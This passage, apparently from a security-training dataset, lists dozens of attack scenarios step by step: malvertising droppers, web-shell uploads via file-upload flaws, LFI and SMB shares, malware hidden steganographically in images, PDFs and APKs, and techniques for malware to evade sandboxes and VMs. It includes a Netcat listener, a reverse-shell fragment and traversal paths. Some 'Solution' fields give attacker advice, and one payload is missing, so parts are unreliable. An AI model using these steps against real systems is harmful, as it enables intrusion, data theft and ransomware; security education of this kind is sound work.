Attack Steps: Step 1: Attacker creates an ad with a visual of a Word document (“Preview Invoice.doc”).Step 2: When user clicks the preview area, inline JS is triggered that auto-downloads Invoice.exe.Step 3: The download begins silently or appears in the corner.Step 4: User thinks the file is a regular DOC and opens it.Step 5: EXE runs and simulates a document while executing malicious code.Step 6: Malware installs a keylogger and creates registry entry.Step 7: Attacker receives logs via hidden HTTP POST requests.
Detection Method: Monitor unknown EXEs, POST logs
Solution: Block inline JS, file extensions

Title: Iframe with Clickjacking Overlay
Scenario Description: Invisible iframe overlaps visible UI, causing users to click malicious buttons thinking they are interacting with real content.
Tools Used: HTML/CSS/JS, Transparent Div, Hidden Iframe, Browser
Attack Steps: Step 1: Ad contains a transparent iframe aligned over a legitimate-looking form or video.Step 2: Victim believes they’re clicking “Play” or “Submit,” but actually clicks hidden malware download button.Step 3: click.js triggers a download of media_tool.exe.Step 4: User runs it assuming it’s a media player.Step 5: Malware installs as background service.Step 6: Service sends telemetry and local browser cookies to attacker.Step 7: Clickjacking is repeated across other fake video sites.
Detection Method: Iframe DOM audit, permission logs
Solution: Prevent iframe interaction via CSP

Title: Fake Anti-Virus Scan Progress Bar
Scenario Description: Ad plays a fake real-time scan animation (progress bar), ending in a malware download when “Fix” is clicked.
Tools Used: HTML5 Animation, Fake AV UI, Malware EXE
Attack Steps: Step 1: Ad shows animation with progress bar and “scanning system...” text.Step 2: After 5–10 seconds, ad displays “3 Threats Found!” and offers “Download Fix Tool.”Step 3: User clicks to download FixAV.exe.Step 4: File is executed; fake AV window opens showing cleaning in progress.Step 5: Meanwhile, malware installs ransomware simulator (optional safe version).Step 6: Files are fake-encrypted and ransom note is shown.Step 7: AV process blocks are bypassed using script obfuscation.
Detection Method: File access logs, ransom note
Solution: EDR, warn against fake AVs

Title: Malvertising via WebRTC Fingerprinting
Scenario Description: Ad detects victim’s IP via WebRTC and delivers region-specific malware drop using fingerprinting.
Tools Used: JS Fingerprinting Script, WebRTC Leak Tool, Malware Page
Attack Steps: Step 1: Ad runs background WebRTC STUN request to detect true IP, even behind VPN.Step 2: If IP matches target region (e.g., India), script loads malware-specific variant.Step 3: Ad shows regional branding (e.g., Flipkart or SBI) to boost trust.Step 4: Victim clicks ad and downloads tailored malware dropper.Step 5: EXE contains hardcoded region-specific C2 address.Step 6: Malware collects local data (time zone, keyboard layout) and sends to attacker.Step 7: Additional modules may be deployed later via scheduled tasks.
Detection Method: WebRTC leak check, DNS monitor
Solution: Disable WebRTC, spoof fingerprint

Title: Malicious Favicon Loader in Ad
Scenario Description: The ad loads a favicon (.ico) which executes JavaScript that drops malware via misused browser behavior.
Tools Used: Favicon.ico Payload (Simulated), JS Trigger, Localhost Server
Attack Steps: Step 1: Ad references a malicious favicon.ico hosted by attacker.Step 2: Favicon is actually a polyglot file (both image + script embedded).Step 3: JavaScript reads the favicon and extracts the payload.Step 4: Payload is saved as EXE in hidden directory.Step 5: User is prompted with fake update alert (“This site needs a plugin.”).Step 6: Clicking “Install Plugin” executes EXE silently.Step 7: Malware sets up startup script and hides itself from Task Manager.
Detection Method: Favicon behavior monitoring
Solution: Scan embedded favicons

Title: Cloud-Based Ad Hosting with Rotating Malware
Scenario Description: Ad is served via a cloud CDN and rotates payloads daily to evade signature-based detection.
Tools Used: AWS S3 or Firebase Hosting, JS Rotation Script, Malware Variants
Attack Steps: Step 1: Attacker uploads rotating payloads (e.g., tool1.exe, tool2.exe) to cloud bucket.Step 2: Ad includes JS logic that checks the date and selects corresponding payload.Step 3: User clicks “Download Cleaner Tool” and is served that day’s malware variant.Step 4: Malware is signed with changing hash to bypass AV.Step 5: File is executed; variant activates different functionality (e.g., keylogger today, RAT tomorrow).Step 6: C2 comms are encrypted and vary endpoints.Step 7: Logs exfiltrated via cloud API.
Detection Method: Compare hash behavior, API traffic
Solution: Monitor CDN-hosted payloads

Title: Audio Trap Ad with Voice-Based Social Engineering
Scenario Description: Ad auto-plays audio convincing the user they must install a security update, followed by malware download.
Tools Used: Audio File, JS Autoplay Script, Fake Security Tool
Attack Steps: Step 1: Attacker hosts a page with hidden <audio autoplay> tag.Step 2: Audio plays message like: “This is Microsoft Security. Your PC is at risk. Download update now.”Step 3: Ad plays alongside the message with “Download Security Update.”Step 4: User panics and clicks, downloading WindowsDefender.exe.Step 5: File executes and installs persistent remote access tool.Step 6: Tool monitors microphone, file system (simulate safely).Step 7: Victim is unaware due to trust in voice format.
Detection Method: Analyze audio play logs, user clicks
Solution: Block autoplay on ads

Title: ASPX Shell via Misconfigured File Upload in HR Portal
Scenario Description: HR portal allows .aspx uploads without proper validation, enabling shell deployment.
Attack Steps: Step 1: Launch the HR portal locally on IIS with insecure file upload setting.Step 2: Upload cmd.aspx pretending it’s a resume (e.g., resume.aspx).Step 3: Confirm successful upload via response or direct URL access.Step 4: Use shell to run commands like ipconfig, netstat, tasklist.Step 5: Add a new user or open remote access port to simulate persistence.
Detection Method: Monitor file uploads and HTTP logs
Solution: Restrict upload types, use sandboxing

Title: PHP Web Shell via .htaccess Bypass
Scenario Description: Attacker uploads a .php file disguised as .jpg and bypasses server config with custom .htaccess.
Attack Steps: Step 1: Create a PHP web shell and rename it to image.jpg.Step 2: Create an .htaccess file that forces Apache to treat .jpg files as PHP.Step 3: Upload both files via an insecure file upload form.Step 4: Access image.jpg via browser to execute PHP shell.Step 5: Simulate file reads, command execution, or shell persistence.
Detection Method: Check for .htaccess misuse, upload behavior
Solution: Restrict .htaccess, scan uploads

Title: ASPX Shell Injection via File Share
Scenario Description: Attacker drops an ASPX shell on an open SMB share linked to a web server directory.
Attack Steps: Step 1: Scan target using Nmap to find open SMB share (smb://server/wwwroot).Step 2: Connect to share via smbclient without authentication.Step 3: Upload cmd.aspx directly to wwwroot directory.Step 4: Open browser and visit http://server/cmd.aspx.Step 5: Execute system commands and demonstrate web persistence.
Vulnerability: Open SMB share mapped to web root
Detection Method: SMB logs, AV scan, Web logs
Solution: Disable anonymous SMB, monitor shares

Title: Web Shell Deployment via PHP Include Abuse
Scenario Description: Attacker uploads PHP code to /uploads/ and uses include($_GET['page']) vulnerability.
Attack Steps: Step 1: Host site with index.php?page=about.php logic.Step 2: Upload backdoor.php to /uploads/ directory.Step 3: Visit index.php?page=../uploads/backdoor.php.Step 4: Backdoor executes and gives attacker command execution ability.Step 5: Use system("whoami"), unlink() to demonstrate access.
Detection Method: Web logs, RASP tools
Solution: Use whitelisted includes

Title: PHP Web Shell via Backup Restoration
Scenario Description: Attacker replaces a backup file with a web shell and triggers restoration.
Attack Steps: Step 1: Access FTP or backup location (simulated environment).Step 2: Replace index.php.bak with shell code and rename.Step 3: Admin triggers restore or site auto-recovers backup.Step 4: Access restored shell in browser.Step 5: Execute system commands and simulate file extraction.
Detection Method: Audit backups, monitor FTP
Solution: Secure backup workflow

Title: ASPX Shell Chained with Reverse Shell Listener
Scenario Description: ASPX shell used to spawn a reverse shell to attacker machine.
Attack Steps: Step 1: Upload cmd.aspx to vulnerable IIS server.Step 2: On attacker’s machine, start Netcat listener (nc -lvnp 4444).Step 3: In browser shell, execute command to connect back: powershell -nop -c "$client = New-Object...".Step 4: Receive reverse shell on Netcat.Step 5: Demonstrate access to files, credentials, persistence.
Detection Method: Monitor outbound connections
Solution: Restrict PowerShell, monitor sockets

Title: PHP Shell Deployment via Misconfigured NGINX Static File Route
Scenario Description: An NGINX config mistake serves .php files as static, allowing execution from /uploads.
Attack Steps: Step 1: Set up a lab server with NGINX and enable file upload.Step 2: Modify NGINX config to treat .php files in /uploads as static (e.g., location /uploads {} without fastcgi_pass).Step 3: Upload shell.php to /uploads using the vulnerable web form.Step 4: Access shell via browser (http://localhost/uploads/shell.php).Step 5: Run test commands such as ls, whoami, and simulate file enumeration.
Detection Method: Web logs, config scans
Solution: Secure NGINX routes, restrict PHP execution

Title: ASPX Shell in Obfuscated ZIP Upload
Scenario Description: ASPX shell is hidden in deeply nested ZIP and uploaded via theme import.
Tools Used: WinRAR, ASPX Shell, CMS Admin Panel
Attack Steps: Step 1: Create ZIP file with structure /theme/assets/images/cmd.aspx.Step 2: Login to test CMS and use "Import Theme" feature.Step 3: Upload ZIP and confirm deployment.Step 4: Visit /themes/assets/images/cmd.aspx in browser.Step 5: Use web shell to simulate command execution like listing users or processes.
Detection Method: Monitor archive contents
Solution: Validate archive paths, block scripts

Title: PHP Shell Deployed via Cross-Site Scripting to Admin Panel
Scenario Description: Stored XSS uploads a malicious link in admin panel which triggers shell drop.
Tools Used: Burp Suite, XSS Payload, PHP Shell
Attack Steps: Step 1: Use a vulnerable comment field to inject: .Step 2: Admin logs in and view triggers the XSS.Step 3: Backend silently receives shell drop via fetch.Step 4: Navigate to uploads/shell.php.Step 5: Simulate exploitation with file reads and simple commands.
Vulnerability: Stored XSS leads to backend write
Detection Method: CSP headers, admin logs
Solution: Sanitize input, use HTML encoding

Title: ASPX Shell via FTP Credential Reuse
Scenario Description: Reused credentials allow FTP login and shell upload to IIS root.
Attack Steps: Step 1: Use public credentials or password spraying to access FTP.Step 2: Log in and navigate to wwwroot.Step 3: Upload cmd.aspx using FileZilla.Step 4: Confirm via browser: http://target/cmd.aspx.Step 5: Execute commands like net user, hostname, and simulate privilege enumeration.
Detection Method: FTP logs, credential audit
Solution: Enforce 2FA, disable anonymous FTP

Title: PHP Shell Uploaded via PDF Injection (Polyglot File)
Scenario Description: Malicious file is crafted to be both PDF and PHP and executed via upload.
Attack Steps: Step 1: Create a polyglot file with PDF header + PHP shell code.Step 2: Rename to invoice.pdf.Step 3: Upload using invoice upload form.Step 4: Access file via URL: http://site.com/uploads/invoice.pdf.Step 5: Execution confirmed if PHP code runs—simulate file access.
Detection Method: Content-type mismatch, deep file inspection
Solution: Use strict MIME validation

Title: ASPX Shell Embedded in .ASAX File
Scenario Description: Shell code is embedded in global .asax file, triggered automatically.
Attack Steps: Step 1: Write ASPX shell inside a Global.asax file.Step 2: Access file system (via FTP/RDP/shell).Step 3: Place file in root of ASP.NET web app.Step 4: Any request triggers shell execution.Step 5: Monitor for code execution and simulate alerting through logs.
Detection Method: Monitor .asax edits, request chain
Solution: Protect global script files

Title: PHP Web Shell via Exif Metadata Injection
Scenario Description: PHP code embedded in image metadata is executed via LFI.
Attack Steps: Step 1: Use exiftool to embed PHP code into image metadata (UserComment).Step 2: Upload image via form that logs metadata.Step 3: Trigger execution via LFI like index.php?page=/logs/access.log.Step 4: Observe code execution via log inclusion.Step 5: Simulate shell activity like dumping variables.
Detection Method: Analyze metadata, sanitize includes
Solution: Block dynamic includes, strip metadata

Title: ASPX Shell via Email Attachment Save Path Exploit
Scenario Description: Email system saves incoming files to web root without sanitation.
Tools Used: Email Client, ASPX Shell, Webmail Panel
Attack Steps: Step 1: Send an email with resume.aspx as an attachment.Step 2: Mail server auto-saves to /webmail/attachments/.Step 3: Visit http://target/attachments/resume.aspx.Step 4: Open browser and execute system commands via shell.Step 5: Simulate reading sensitive files or sending data out.
Detection Method: Monitor saved files, email filters
Solution: Block risky file extensions

Title: PHP Web Shell via Unprotected Development Environment
Scenario Description: Developer leaves dev_upload.php exposed, allowing direct shell upload.
Attack Steps: Step 1: Discover unlinked page dev_upload.php using Dirb or manual guess.Step 2: Upload shell.php using the unprotected form.Step 3: Access uploads/shell.php in browser.Step 4: Use shell to run ls, cat, and simulate password file discovery.Step 5: Log the results in separate file to simulate data theft.
Detection Method: Scan for unlisted endpoints
Solution: Lockdown dev paths

Title: ASPX Web Shell via Unused Admin Panel
Scenario Description: Obsolete admin page allows file upload with no restrictions.
Attack Steps: Step 1: Locate unused /admin-old/upload.aspx page.Step 2: Upload cmd.aspx pretending it’s a logo file.Step 3: Access uploaded file at /uploads/cmd.aspx.Step 4: Use shell to execute ipconfig, net users.Step 5: Add a new local admin user to simulate privilege persistence.
Detection Method: Web audit logs
Solution: Remove unused panels

Title: PDF File with Embedded Trojan via StegPDF
Scenario Description: Attacker embeds a trojan into a PDF that looks like an invoice, bypassing security scanners.
Attack Steps: Step 1: Attacker creates a malicious trojan file (e.g., data stealer).Step 2: Attacker uses StegPDF to embed the trojan inside a legitimate-looking PDF.Step 3: File named invoice.pdf is sent via phishing email.Step 4: Victim opens the PDF, which has JavaScript to drop and execute the trojan.Step 5: Malware silently executes in the background.Step 6: Victim’s browser credentials and clipboard data are stolen.Step 7: Data is exfiltrated to attacker.
Vulnerability: PDF Reader vulnerability, No email scanning
Detection Method: Sandbox PDF analysis, Disable JS in PDF viewers
Solution: Train staff to identify phishing, Restrict macros

Title: StegoZIP Archive via Image on Social Media
Scenario Description: A malicious ZIP archive is hidden inside a PNG and uploaded to social media, later downloaded and extracted by target.
Attack Steps: Step 1: Attacker creates a compressed ZIP containing malware.Step 2: ZIP is embedded into a PNG file using zsteg or a script.Step 3: Attacker uploads the image to social media platform with enticing caption.Step 4: Victim downloads the image, believing it to be a graphic asset or wallpaper.Step 5: A provided script or command extracts the hidden ZIP file from the image.Step 6: Victim executes the malicious content inside ZIP.Step 7: Malware executes and gives attacker system access or starts encryption (ransomware).
Vulnerability: Curiosity exploitation, Hidden ZIP bypasses scanners
Detection Method: Content hashing, Outbound behavior monitoring
Solution: Block downloads of unknown ZIPs, Check image integrity

Title: Concealing Ransomware Payload in Image Footer
Scenario Description: Ransomware binary hidden in image file's footer data and extracted via script.
Attack Steps: Step 1: Attacker prepares ransomware executable (encryptor.exe).Step 2: Using a Python script, they append the binary at the end of a .jpg image file.Step 3: Victim is tricked into downloading the image via email or chat, labeled as "EventPoster.jpg".Step 4: A second script (extractor.py) is shared or left on system disguised as utility.Step 5: When run, extractor.py reads the last bytes of the image and writes them to encryptor.exe.Step 6: Script then silently executes the payload.Step 7: Ransomware encrypts files and displays a ransom note.
Vulnerability: Image processing tools cannot parse appended binary
Detection Method: Hash comparison of images, SIEM alerting
Solution: Monitor script behavior, block unknown executables

Title: Video Steganography via LSB for Remote Access Tool
Scenario Description: Attacker hides a RAT script within video file using LSB and tricks victim into extraction.
Attack Steps: Step 1: Attacker prepares a Python-based RAT script (client.py).Step 2: Using SilentEye, they embed the script in the least significant bits (LSB) of a .mp4 video.Step 3: Video is titled “SummerTrip.mp4” and shared via USB or Google Drive.Step 4: Victim is lured by its title or appearance and downloads it.Step 5: They are provided with a disguised tool or are tricked into running a decoding script.Step 6: Script extracts and saves client.py, which is then executed.Step 7: Remote access is established with attacker’s command server.
Detection Method: LSB detection tools, outbound monitoring
Solution: Block execution of unauthorized scripts

Title: Excel File with Stego Image Macro Dropper
Scenario Description: Excel macro extracts and executes malware hidden in a chart image within the spreadsheet.
Attack Steps: Step 1: Attacker creates a stego image with embedded malware using Steghide.Step 2: This image is inserted into an Excel spreadsheet titled SalesReport2024.xlsx.Step 3: An auto-run macro is written in VBA that extracts the image and uses Steghide commands via shell.Step 4: On file open, macro triggers and extracts hidden .exe to temp folder.Step 5: It silently runs the .exe in the background.Step 6: Malware begins beaconing to attacker’s IP.Step 7: Full command-and-control channel is established.
Detection Method: Macro behavior monitoring, File sandboxing
Solution: Disable macros by default, Use Office hardening GPOs

Title: Stego Malware Hidden in Android APK Image Resource
Scenario Description: Android malware uses image in app resources to carry an additional malicious .dex file.
Attack Steps: Step 1: Attacker develops a fake utility app (BatteryBooster.apk).Step 2: Malicious .dex payload is embedded inside a drawable image using Steghide.Step 3: APK is modified to include a decoder routine that extracts and loads .dex dynamically.Step 4: Victim installs APK on Android phone.Step 5: On launch, the decoder reads the drawable image, extracts the .dex, and loads it using Java reflection.Step 6: Malware starts keylogging and camera access.Step 7: Logs are exfiltrated to attacker server.
Detection Method: Static & dynamic APK analysis
Solution: Disable installation from unknown sources

Title: Image-Based Malware Delivery via Discord CDN
Scenario Description: Image with malware payload is shared via Discord’s CDN, then downloaded and executed.
Attack Steps: Step 1: Attacker creates reverse shell script (rev.ps1) and embeds it into funnycat.png using StegoStick.Step 2: Image is uploaded to Discord channel; Discord hosts it on CDN.Step 3: Victim is sent the direct CDN link, e.g., cdn.discordapp.com/.../funnycat.png.Step 4: Victim is told it's a meme or productivity meme.Step 5: A second script provided (extract.ps1) extracts the PowerShell payload and executes it.Step 6: Shell connects to attacker.Step 7: Attacker gains system control.
Detection Method: Monitor for powershell downloads, scan image entropy
Solution: Restrict cloud access, educate on suspicious links

Title: Favicon.ico Steganography in Web Attack
Scenario Description: Malware is hidden inside favicon.ico file of a malicious site and executed by a loader script.
Attack Steps: Step 1: Attacker modifies a real website template and hosts it on a lookalike domain.Step 2: They embed malware into favicon.ico using hex manipulation.Step 3: Victim is lured to visit site through phishing email.Step 4: A script in the webpage extracts the hidden code from favicon.ico.Step 5: Extracted script is written to disk and executed via browser exploit or downloaded launcher.Step 6: Backdoor connects to attacker.Step 7: Site looks innocent; payload is delivered silently.
Detection Method: Analyze favicon size & entropy, proxy log analysis
Solution: Block unknown sites, inspect favicons in firewall

Title: DNS TXT Record Stego Triggered by Image Loader
Scenario Description: Malware inside image retrieves command payload from DNS TXT records.
Attack Steps: Step 1: Attacker embeds a small script into an image to query a DNS TXT record.Step 2: Image is loaded by user via web or email.Step 3: Loader script inside image (executed externally) uses nslookup to query attacker-controlled domain.Step 4: Payload (base64) is stored in DNS TXT field.Step 5: Payload is decoded and executed by local script.Step 6: Malware executes with real-time DNS C2.Step 7: No outbound HTTP used, evading detection.
Vulnerability: DNS often not inspected in depth
Detection Method: DNS logging, anomaly detection
Solution: Block suspicious DNS queries, inspect TXT records

Title: Malware Hidden in Social Engineering Poster (Printed)
Scenario Description: Printed image includes QR code stego that links to a malware download site.
Tools Used: SteganQR, QR Code Generator, Android Scanner
Attack Steps: Step 1: Attacker creates a poster with a QR code that contains an encoded malicious URL, hidden using steganographic QR manipulation.Step 2: Poster is printed and displayed in public area with text like “Free Wi-Fi for Students.”Step 3: Victim scans QR using mobile device.Step 4: QR leads to a seemingly safe website, which auto-downloads an image.Step 5: Image contains an embedded APK file which is extracted via mobile shell or a prompt.Step 6: Victim is tricked into installing the APK.Step 7: Malware starts SMS exfiltration and contact scraping.
Detection Method: QR scan tracking, antivirus for mobile
Solution: Warn users about untrusted QR codes

Title: HTML Stego Payload via SVG Image
Scenario Description: SVG image contains malicious JavaScript stored in XML comments or <script> tags.
Attack Steps: Step 1: Attacker creates an SVG image (vector file) using Inkscape.Step 2: JavaScript payload is added inside <script> tags or XML comments.Step 3: The SVG is embedded in an HTML file and sent as a newsletter or stored on an intranet site.Step 4: Victim opens the HTML in browser; embedded script triggers.Step 5: Script sends system fingerprinting data to attacker's server.Step 6: If vulnerable, the script downloads additional malware silently.Step 7: Attacker gains persistent control via browser-based backdoor.
Vulnerability: SVGs are treated as safe images
Detection Method: SVG file parsing and JS behavior analysis
Solution: Sanitize SVG content before rendering

Title: Email Signature Image with Payload
Scenario Description: Corporate email signature includes image with malware hidden in EXIF data.
Attack Steps: Step 1: Attacker creates a corporate-style email signature with embedded company logo.Step 2: Using ExifTool, attacker hides a PowerShell payload inside EXIF comments.Step 3: The image is used in every email signature from attacker.Step 4: Recipient receives a convincing email and downloads signature image locally (email client does this by default).Step 5: A macro or script is triggered by the email client or accompanying attachment.Step 6: Script reads EXIF data and executes embedded PowerShell code.Step 7: Malware initiates lateral movement.
Vulnerability: Embedded image in email signature, EXIF trust
Detection Method: Email sandboxing, EXIF scanning
Solution: Block images from external domains in mail

Title: Hiding Keylogger in Slack Profile Picture
Scenario Description: Image in Slack profile holds malware, which is extracted via Slack bot script.
Attack Steps: Step 1: Attacker uploads a PNG with embedded keylogger binary to Slack profile.Step 2: Victim interacts with attacker in a shared Slack channel.Step 3: A Slack bot or script scrapes profile image via API.Step 4: Bot decodes the image using Steghide with known password.Step 5: Keylogger is extracted and launched from memory.Step 6: Keys are logged and uploaded to Slack private channel.Step 7: Attacker silently monitors without ever sending a message.
Vulnerability: Slack image CDN trust, bot scripting
Detection Method: Slack API monitoring, profile image analysis
Solution: Limit bot API permissions, monitor file size anomalies

Title: Malware-Loaded ZIP in Base64 Hidden in Stego Meme
Scenario Description: A stego meme hides a base64-encoded ZIP archive containing ransomware.
Attack Steps: Step 1: Attacker creates ZIP archive containing ransomware binaries.Step 2: Archive is base64 encoded into text.Step 3: Encoded string is hidden inside image pixels using Python and Stegano library.Step 4: Meme is sent through social media or chat group.Step 5: Victim downloads and runs decoder tool (given as a photo viewer).Step 6: Tool decodes ZIP and silently executes contents.Step 7: Ransomware begins encrypting system files.
Vulnerability: Hidden ZIP bypasses antivirus in image form
Detection Method: Monitor decoded ZIP file activity, EDR alerts
Solution: User training on memes, content integrity validation

Title: Stego Malware Inside Boot Logo on IoT Device
Scenario Description: IoT device boot image is altered with stego payload that executes root shell on boot.
Attack Steps: Step 1: Attacker extracts boot image of IoT device using binwalk.Step 2: Injects root shell command using stego tool inside a BMP splash screen.Step 3: Repackages firmware and uploads back to device via USB or OTA.Step 4: On next boot, device displays boot logo with embedded payload.Step 5: Payload is read by boot script and initiates a root shell in background.Step 6: Device now allows attacker SSH access with root.Step 7: Attack persists across reboots.
Vulnerability: Firmware upload weakness, image parsing trust
Detection Method: Firmware integrity check, bootloader logs
Solution: Secure firmware signing, disable OTA overwrites

Title: PDF Invoice with Embedded Stego JavaScript Downloader
Scenario Description: PDF file with stego image executes JavaScript that pulls malware from CDN.
Attack Steps: Step 1: Attacker creates a realistic invoice PDF with embedded logo.Step 2: Logo image includes JavaScript payload hidden in metadata.Step 3: PDF viewer loads logo and reads metadata using PDF.js.Step 4: JavaScript is extracted and evaluated.Step 5: Script downloads and executes infostealer.exe from CDN.Step 6: Victim receives fake invoice email and opens the PDF.Step 7: Malware steals browser autofill data silently.
Detection Method: PDF behavior monitoring
Solution: Disable JavaScript in PDF readers

Title: MS Word Document with Stego Image and Macro
Scenario Description: Stego image embedded in Word document is used to deliver info-stealing macro.
Attack Steps: Step 1: Attacker creates an invoice.docx file with company logo image.Step 2: Image contains embedded malware via StegoSuite.Step 3: A macro in the document reads image bytes and writes to .exe file.Step 4: File is then executed silently via Shell command.Step 5: Attacker receives log files via HTTP POST.Step 6: Document is sent via BEC-style email.Step 7: Malware hides in temp folder and runs at startup.
Detection Method: Macro activity logging, Office hardening
Solution: Block macros, train on email hygiene

Title: AutoCAD Drawing with Stego Command File
Scenario Description: DWG drawing file has image containing .bat script that is extracted during render.
Attack Steps: Step 1: Attacker designs a fake DWG floorplan with company logo image.Step 2: Image includes stego .bat file to modify system registry.Step 3: Drawing is sent to architecture firm under fake client request.Step 4: Victim opens DWG and linked script executes during rendering.Step 5: Batch script disables antivirus.Step 6: Malware is then downloaded and executed.Step 7: Attacker maintains undetected access.
Detection Method: Monitor AutoCAD macros, alert on registry edits
Solution: Disable macros in AutoCAD, use signed CAD files

Title: USB Wallpaper Stego with Auto-Extracting Script
Scenario Description: A USB contains a beautiful wallpaper image that hides an executable, auto-extracted via batch script.
Attack Steps: Step 1: Attacker embeds rat.exe into sunset.jpg using Steghide with a password.Step 2: Places sunset.jpg and autorun.bat on USB.Step 3: Script extracts the hidden file using hardcoded Steghide command and executes it.Step 4: Victim plugs USB, views image, and double-clicks the batch thinking it launches a slideshow.Step 5: Batch silently extracts and runs the RAT.Step 6: Attacker gets full remote access to victim’s PC.Step 7: Script deletes traces of extraction.
Vulnerability: Lack of USB scanning, autorun temptation
Detection Method: USB activity monitoring, autorun policy enforcement
Solution: Disable USB autorun, educate users on USB risks

Title: Stego JS Script Inside PNG Served via Ad Network
Scenario Description: PNG file served by ad network hides JavaScript that is executed via browser vulnerability.
Attack Steps: Step 1: Attacker prepares malicious JavaScript that runs a crypto miner.Step 2: Embeds the code in PNG file using StegoJS.Step 3: Uploads PNG as part of an ad campaign to legitimate ad network.Step 4: Victim visits news site where ad loads the image.Step 5: Exploited browser plugin allows script in image to be executed in-memory.Step 6: Crypto miner starts silently in background.Step 7: System resources are hijacked for mining.
Vulnerability: Ad network content not deeply scanned
Detection Method: EDR behavior analytics, CPU anomaly detection
Solution: Use browser plugins to block crypto mining

Title: CPUID-Based VM Detection
Scenario Description: The malware checks for known VM processor signatures to detect if it's running inside a virtual machine before executing.
Attack Steps: Step 1: Create a basic Windows program using C++.Step 2: Use the __cpuid instruction to query the CPU's manufacturer string.Step 3: Compare the result to known VM vendors (e.g., "VMware", "VirtualBox").Step 4: If a VM string is detected, terminate the malware or pause execution.Step 5: If no VM is detected, proceed to malicious payload execution.Step 6: In sandbox tests, the malware does nothing, bypassing detection.
Impact: Malware avoids execution in test environments
Detection Method: Monitor use of CPUID and process termination logic
Solution: Obfuscate hardware signature access or detect VM behavior differently

Title: Mouse Movement Anti-Sandbox Trick
Scenario Description: Malware checks for human interaction like mouse movements to determine if it's running in a sandbox before proceeding.
Attack Steps: Step 1: Create a Python program that waits for mouse movement using PyAutoGUI.Step 2: Set a timer (e.g., 30 seconds) to monitor user interaction.Step 3: If no mouse movement is detected, exit the program.Step 4: If mouse is moved, the malware proceeds to execute its payload.Step 5: Run this in a sandbox environment where there's no mouse movement—malware won’t trigger.Step 6: On real machine, malware proceeds if it detects user presence.
Detection Method: Monitor delay-based execution logic
Solution: Simulate user activity in sandboxes

Title: MAC Address Check for Virtual NICs
Scenario Description: Malware checks MAC address prefixes of network interfaces to detect VM environments (e.g., VMware, VirtualBox).
Attack Steps: Step 1: Create a Python script that retrieves the MAC address of active network interfaces.Step 2: Check if the MAC address starts with known vendor prefixes (e.g., VMware: 00:05:69).Step 3: If a match is found, malware exits.Step 4: If no VM NIC is found, the script proceeds to call a mock payload.Step 5: This prevents execution in most sandbox VMs.Step 6: Simulate both real NICs and VM NICs to understand the bypass behavior.
Detection Method: Monitor NIC inspections in scripts
Solution: Randomize MAC addresses or avoid hardcoded checks

Title: Sleep-Based Sandbox Bypass
Scenario Description: Malware uses long sleep durations to stall sandbox analysis engines and delay real execution.
Attack Steps: Step 1: Write a Python malware stub that starts with a time.sleep(600) delay (10 minutes).Step 2: After sleep, it prints a message or executes dummy payload.Step 3: Sandboxes that limit execution time (e.g., 5 mins) terminate before malware does anything.Step 4: On real machines, malware resumes after the delay.Step 5: Modify script to detect patched sleep (i.e., bypassed sleep) to enhance stealth.
Detection Method: Detect usage of long sleep calls
Solution: Use sandbox time acceleration or detect time jumps

Title: Process Name & Window Title Detection
Scenario Description: Malware inspects running processes and window titles for known sandbox tools before running.
Attack Steps: Step 1: Use Python to retrieve the list of running processes (via tasklist).Step 2: Search for sandbox-related processes like vboxservice.exe, vmtoolsd.exe, wireshark.exe, Procmon.exe.Step 3: Additionally, use libraries like pygetwindow to check if window titles contain keywords like "Sandbox", "Debugger", etc.Step 4: If detected, the malware quits.Step 5: If not, proceed with dummy payload or message.Step 6: Simulate running malware with and without these tools active.
Detection Method: Monitor process list scans and early exits
Solution: Obfuscate or rename security tools during analysis

Title: File System Artifact Check
Scenario Description: Malware looks for files or folders specific to analysis tools like Cuckoo or Vbox.
Attack Steps: Step 1: Use Python to search for paths like C:\Program Files\Oracle\VirtualBox Guest Additions, C:\cuckoo, etc.Step 2: If these exist, malware exits.Step 3: Otherwise, continue with mock payload.Step 4: Test behavior on real vs. sandboxed system with those folders.Step 5: Simulate folder removal and analyze response.Step 6: Log file access in sandbox for detection.
Impact: Evades when common analyst tools are installed
Detection Method: Monitor for access to telltale folders
Solution: Rename or hide forensic tools from default paths

Title: Clipboard Monitoring Check
Scenario Description: Malware verifies if clipboard behaves normally to detect analysis environments that monitor copy-paste actions.
Attack Steps: Step 1: Use Python’s pyperclip to copy a string to clipboard.Step 2: Immediately read it back.Step 3: If value is different or inaccessible, assume sandbox interference.Step 4: Exit quietly.Step 5: If clipboard acts normally, malware proceeds.Step 6: Run on real and sandboxed systems and compare results.
Detection Method: Detect clipboard read/write anomalies
Solution: Simulate clipboard in sandbox or restrict use

Title: Timing Analysis Trick
Scenario Description: Malware measures time taken for operations and compares it with expected durations to detect VM slowdowns.
Attack Steps: Step 1: Use Python time.time() to record start time.Step 2: Perform a trivial task (e.g., sum a large array).Step 3: Record end time and calculate duration.Step 4: If time taken is significantly longer than expected, assume overhead from analysis.Step 5: Exit quietly.Step 6: On fast hardware, continue execution normally.
Detection Method: Log execution time anomalies
Solution: Optimize sandbox performance or ignore time deltas

Title: Screenshot Resolution Check
Scenario Description: Malware takes a screenshot and inspects the resolution—low resolutions suggest VMs.
Attack Steps: Step 1: Use pyautogui.size() to get screen resolution.Step 2: If screen resolution is ≤ 1024x768, assume VM or sandbox.Step 3: If resolution is ≥ 1920x1080, proceed.Step 4: Use PIL to save screenshot for inspection.Step 5: Run malware in different resolution environments.Step 6: Compare execution behaviors.
Vulnerability: Low screen resolution typical of VMs
Detection Method: Monitor API access to resolution settings
Solution: Simulate real screen sizes in sandboxes

Title: Hypervisor Brand Detection via CPUID
Scenario Description: Malware uses advanced CPUID queries to detect presence of hypervisors like VMware, Hyper-V.
Attack Steps: Step 1: Write a C++ program that calls the CPUID instruction with function ID 0x40000000.Step 2: This special CPUID call returns a vendor-neutral hypervisor signature.Step 3: Compare the returned string to known hypervisors like Microsoft Hv, VMwareVMware, or KVMKVMKVM.Step 4: If a match is found, the malware exits.Step 5: If no hypervisor is detected, the malware proceeds with a mock payload.Step 6: Simulate this behavior in both VM and physical environments to observe difference.
Impact: Evades sandbox running under virtual machine
Detection Method: Monitor hypervisor signature detection calls
Solution: Mask or spoof hypervisor CPUID responses

Title: ACPI Table Inspection
Scenario Description: Malware inspects Advanced Configuration and Power Interface (ACPI) tables which are often unique in virtual environments.
